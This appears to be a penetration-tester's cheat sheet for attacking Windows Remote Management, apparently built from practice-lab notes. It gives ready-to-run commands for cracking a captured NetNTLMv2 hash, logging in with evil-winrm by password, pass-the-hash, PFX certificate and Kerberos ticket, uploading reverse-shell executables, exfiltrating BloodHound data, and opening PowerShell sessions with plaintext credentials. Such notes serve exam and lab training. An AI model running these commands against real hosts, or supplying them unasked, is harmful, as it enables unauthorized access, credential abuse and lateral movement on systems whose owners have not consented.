# (5985) WinRM

<details>

<summary>Uses</summary>

* Remotely communicate and interface with hosts

- Execute commands remotely on systems that are not local to you but are network accessible

* Monitor, manage and configure servers, operating systems and client machines from a remote location

</details>

<details>

<summary>Cracking NetNTLMv2 hashes for login</summary>

```bash
echo "Administrator::DESKTOPH3OF232:1122334455667788:7E0A87A2CCB487AD9B76C7B0AEAEE133:0101000000000000005F3214B534D
801F0E8BB688484C96C0000000002000800420044004F00320001001E00570049004E002D004E0048004500
3800440049003400410053004300510004003400570049004E002D004E00480045003800440049003400410
05300430051002E00420044004F0032002E004C004F00430041004C0003001400420044004F0032002E004C
004F00430041004C0005001400420044004F0032002E004C004F00430041004C0007000800005F3214B534D
801060004000200000008003000300000000000000001000000002000000C2FAF941D04DCECC6A7691EA926
30A77E073056DA8C3F356D47C324C6D6D16F0A0010000000000000000000000000000000000009002000630
06900660073002F00310030002E00310030002E00310034002E00320035000000000000000000" >
hash.txt
```

```
john -w=/usr/share/wordlists/rockyou.txt hash.txt
```

</details>

<details>

<summary>Evil-winrm for login</summary>

* Using password:

```bash
evil-winrm -i 10.129.136.91 -u administrator -p badminton
```

* Using hash:

```bash
evil-winrm -i 10.11.1.21 -u pete -H 0f951bc4fdc5dfcd148161420b9c6207
```

* Uploading files to Victim

```bash
upload reverse_139.exe
```

</details>

<details>

<summary>Upload/Download files (Evil-Winrm)</summary>

### Download (have to put full file paths)

```bash
download c:\temp\20230511182430_BloodHound.zip /oscp/ad/20230511182430_BloodHound.zip
```

### Upload (doesn't need full file paths)

```bash
upload reverse.exe
```

</details>

<details>

<summary>Enter-PSSession</summary>

```powershell
$Password = ConvertTo-SecureString "iydgTvmujl6f" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ("cowmotors\svc_web", $password)
$session = Enter-PSSession -computername "WEB02" -credential $cred
```

</details>

<details>

<summary>Login via PFX File</summary>

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out publicCert.pem
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes

# Since port 5986 (WinRM with SSL) is open instead of 5985 (WinRM):
evil-winrm -i 10.10.11.152 -c publicCert.pem -k priv-key.pem -S
```

</details>

<details>

<summary>Evil-WinRM Kerberos Login</summary>

Edit /etc/krb5.conf

```bash
[libdefaults]
        default_realm = SCRM.LOCAL

[realms]
SCRM.LOCAL = {
        kdc = dc1.scrm.local
}

[domain_realm]
        .scrm.local = SCRM.LOCAL
        scrm.local = SCRM.LOCAL
```

Create ticket for MiscSvc:

```bash
impacket-getTGT scrm.local/MiscSvc:ScrambledEggs9900
```

Login via evil-winrm

```bash
export KRB5CCNAME=MiscSvc.ccache
sudo rdate -n 10.10.11.168

evil-winrm -r scrm.local -i dc1.scrm.local
```



\----OR----

```
[libdefaults]
    default_realm = ABSOLUTE.HTB
    kdc_timesync = 1
    ccache_type = 4
    forwardable = true
    proxiable = true
    fcc-mit-ticketflags = true
[realms]
    ABSOLUTE.HTB = {
        kdc = dc.absolute.htb
        admin_server = dc.absolute.htb
        default_domain = absolute.htb
    }
```

```
kinit <username>
```

```
evil-winrm -i dc.absolute.htb -r ABSOLUTE.HTB
```

</details>
